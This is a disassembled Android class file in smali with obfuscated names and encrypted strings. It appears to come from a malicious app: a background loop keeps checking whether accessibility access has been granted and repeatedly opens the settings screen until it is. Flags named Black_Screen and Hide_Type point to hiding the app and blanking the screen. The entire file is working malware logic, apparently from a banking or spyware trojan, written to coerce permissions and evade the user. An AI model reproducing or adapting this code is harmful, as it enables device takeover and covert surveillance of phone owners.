.class Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;->f(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    iput-object p2, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method

.method public static synthetic a(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->b(Landroid/content/Context;)V

    return-void
.end method

.method private static synthetic b(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/vknnolqo/p9sv5zvf/FtJVk3Ba;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    const/4 v0, 0x0

    move v1, v0

    move v2, v1

    :cond_0
    :goto_0
    if-nez v1, :cond_6

    const-wide/16 v3, 0xc8

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    const-class v4, Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->b(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v3

    const/4 v4, 0x1

    const/16 v5, 0x8

    if-eqz v3, :cond_5

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Use_Access:Ljava/lang/String;

    new-array v6, v4, [B

    const/16 v7, 0x5b

    aput-byte v7, v6, v0

    new-array v7, v5, [B

    fill-array-data v7, :array_0

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    new-array v3, v5, [B

    fill-array-data v3, :array_1

    new-array v6, v5, [B

    fill-array-data v6, :array_2

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_2

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Use_Access:Ljava/lang/String;

    new-array v3, v4, [B

    const/16 v6, 0x2e

    aput-byte v6, v3, v0

    new-array v6, v5, [B

    fill-array-data v6, :array_3

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const-wide/16 v6, 0x1f4

    if-eqz v1, :cond_1

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Black_Screen:Ljava/lang/String;

    new-array v3, v4, [B

    const/16 v8, -0x4e

    aput-byte v8, v3, v0

    new-array v8, v5, [B

    fill-array-data v8, :array_4

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-eqz v1, :cond_1

    :try_start_2
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    const/4 v1, 0x5

    :try_start_3
    new-array v1, v1, [B

    fill-array-data v1, :array_5

    new-array v3, v5, [B

    fill-array-data v3, :array_6

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x0

    invoke-static {v1, v3}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_1

    :catch_2
    move-exception v0

    goto/16 :goto_5

    :cond_1
    :goto_1
    :try_start_4
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :catch_3
    :try_start_5
    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    const/16 v3, 0x10

    new-array v3, v3, [B

    fill-array-data v3, :array_7

    new-array v5, v5, [B

    fill-array-data v5, :array_8

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v5, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v1, v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :try_start_6
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    :try_start_7
    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->a()[Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->c(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_4

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h3(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    goto :goto_3

    :cond_2
    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/bq;->a(Landroid/content/Context;)V

    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-static {v1, v3}, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;->a(Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;Landroid/content/Context;)V

    if-nez v2, :cond_4

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Hide_Type:Ljava/lang/String;

    new-array v2, v4, [B

    const/16 v3, -0x18

    aput-byte v3, v2, v0

    new-array v3, v5, [B

    fill-array-data v3, :array_9

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    if-eqz v1, :cond_3

    :try_start_8
    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->HA:Ljava/lang/String;

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-static {v1, v2, v3}, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;->b(Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;Ljava/lang/String;Landroid/content/Context;)V

    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->MA:Ljava/lang/String;

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-static {v1, v2, v3}, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;->c(Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;Ljava/lang/String;Landroid/content/Context;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    goto :goto_2

    :catch_5
    move-exception v1

    :try_start_9
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_3
    :goto_2
    move v2, v4

    :cond_4
    :goto_3
    const-wide/32 v5, 0xc350

    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    :goto_4
    move v1, v4

    goto/16 :goto_0

    :cond_5
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Use_Access:Ljava/lang/String;

    new-array v6, v4, [B

    const/4 v7, -0x3

    aput-byte v7, v6, v0

    new-array v7, v5, [B

    fill-array-data v7, :array_a

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    new-instance v1, Landroid/content/Intent;

    const/16 v3, 0x35

    new-array v3, v3, [B

    fill-array-data v3, :array_b

    new-array v6, v5, [B

    fill-array-data v6, :array_c

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    new-array v7, v5, [B

    fill-array-data v7, :array_d

    new-array v5, v5, [B

    fill-array-data v5, :array_e

    invoke-static {v7, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->f:Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {v1, v3, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v3, 0x40000000    # 2.0f

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    invoke-virtual {v3, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v1, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iget-object v3, p0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC$a;->e:Landroid/content/Context;

    new-instance v5, Lcom/vknnolqo/p9sv5zvf/SgAi2Jdf;

    invoke-direct {v5, v3}, Lcom/vknnolqo/p9sv5zvf/SgAi2Jdf;-><init>(Landroid/content/Context;)V

    const-wide/16 v6, 0x2710

    invoke-virtual {v1, v5, v6, v7}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2

    goto :goto_4

    :goto_5
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_6
    return-void

    :array_0
    .array-data 1
        0x6at
        -0x44t
        0x74t
        0x69t
        -0x79t
        0x42t
        -0x15t
        0x41t
    .end array-data

    :array_1
    .array-data 1
        -0x61t
        0x6bt
        -0x3et
        0x60t
        0x46t
        0x77t
        -0x16t
        -0x55t
    .end array-data

    :array_2
    .array-data 1
        -0x10t
        0x5t
        -0x5ft
        0x3ft
        0x24t
        0x3t
        -0x68t
        -0x2et
    .end array-data

    :array_3
    .array-data 1
        0x1ft
        -0x7bt
        0x75t
        0x72t
        -0x1at
        0x45t
        -0x4bt
        0x5t
    .end array-data

    :array_4
    .array-data 1
        -0x7dt
        0x4ct
        0x3t
        -0x4bt
        0x77t
        -0x6dt
        -0x43t
        -0x6ct
    .end array-data

    :array_5
    .array-data 1
        -0x4dt
        0x1t
        0x42t
        -0x14t
        -0x42t
    .end array-data

    nop

    :array_6
    .array-data 1
        -0x2ft
        0x6dt
        0x23t
        -0x71t
        -0x2bt
        0x23t
        -0x2bt
        -0x6at
    .end array-data

    :array_7
    .array-data 1
        0x54t
        0x1t
        0x45t
        -0x51t
        0x1et
        -0x47t
        0x10t
        0x41t
        0x44t
        0x1et
        0x50t
        -0x6dt
        0x11t
        -0x77t
        0x18t
        0x4dt
    .end array-data

    :array_8
    .array-data 1
        0x36t
        0x6dt
        0x24t
        -0x34t
        0x75t
        -0x1at
        0x76t
        0x28t
    .end array-data

    :array_9
    .array-data 1
        -0x75t
        -0x3at
        0x4bt
        -0x31t
        0x55t
        0x6et
        -0x60t
        0x59t
    .end array-data

    :array_a
    .array-data 1
        -0x34t
        -0x42t
        -0x9t
        -0x3at
        -0x20t
        -0xat
        -0x10t
        -0x23t
    .end array-data

    :array_b
    .array-data 1
        -0x40t
        0x6et
        -0xdt
        -0x54t
        -0x69t
        0x76t
        0x44t
        -0x5dt
        -0x2et
        0x65t
        -0x1dt
        -0x56t
        -0x6ft
        0x71t
        0x47t
        -0x2t
        -0x71t
        0x52t
        -0x2et
        -0x71t
        -0x53t
        0x5at
        0x73t
        -0x27t
        -0x2t
        0x49t
        -0x30t
        -0x70t
        -0x49t
        0x4dt
        0x65t
        -0x2et
        -0x1dt
        0x41t
        -0x3dt
        -0x76t
        -0x43t
        0x4dt
        0x79t
        -0x2et
        -0x12t
        0x50t
        -0x3dt
        -0x69t
        -0x4bt
        0x56t
        0x7at
        -0x34t
        -0xbt
        0x49t
        -0x28t
        -0x70t
        -0x55t
    .end array-data

    nop

    :array_c
    .array-data 1
        -0x5ft
        0x0t
        -0x69t
        -0x22t
        -0x8t
        0x1ft
        0x20t
        -0x73t
    .end array-data

    :array_d
    .array-data 1
        0x48t
        0x21t
        0x1at
        0x7t
        -0x74t
        -0x50t
        -0x2ct
        0x7t
    .end array-data

    :array_e
    .array-data 1
        0x38t
        0x40t
        0x79t
        0x6ct
        -0x13t
        -0x29t
        -0x4ft
        0x3dt
    .end array-data
.end method
